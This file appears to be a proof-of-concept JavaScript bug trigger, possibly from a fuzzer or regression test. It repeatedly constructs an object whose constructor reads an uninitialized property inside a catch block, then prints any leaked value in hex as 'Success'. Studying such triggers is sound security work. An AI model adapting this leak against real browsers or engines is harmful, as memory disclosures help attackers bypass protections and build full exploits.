l = undefined;
function v10() {
    let v15 = 0;
    try {
        const v16 = v15.foobar();
    } catch(e7) {
        l = this.uninitialized;
    }
    this.uninitialized = 1337;
}
for (let i14 = 0; i14 < 100; i14++) {
    const v20 = new v10();
    const v38 = v20;
    if (l !== undefined) {
        console.log("Success: 0x" + l.toString(16));
        break;
    }
}
